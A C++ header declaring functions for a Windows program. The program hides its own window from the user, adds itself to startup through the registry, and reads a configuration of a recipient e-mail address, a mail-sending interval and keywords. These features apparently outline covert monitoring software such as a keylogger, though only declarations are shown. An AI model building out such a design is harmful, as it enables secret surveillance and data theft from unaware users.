#pragma once

#include <Windows.h>

#include <string>
#include <vector>

namespace utility
{
	// Hides window so it's not visible for the user (it's not minimized, it's hidden)
	void hide_window();

	// Adds application to startup by creating Register key
	void add_application_to_startup();

	// Gets application path - Windows specific
	std::string get_application_path();

	// Checks if a given file exists on the HDD
	bool file_exists(const std::string &file_name);
};

// Related to configuration.txt file that has user configuration
namespace configuration
{
	const std::string configuration_file_name = "configuration.txt";
	
	struct configuration_file_content
	{
		std::string mail_to;
		int mail_send_loop;
		std::vector<std::string> keywords;
	};

	configuration_file_content load_configuration_from_file();

	void save_configuration_to_file(std::string mail_to, int email_send_loop_time, std::vector<std::string> keywords);
};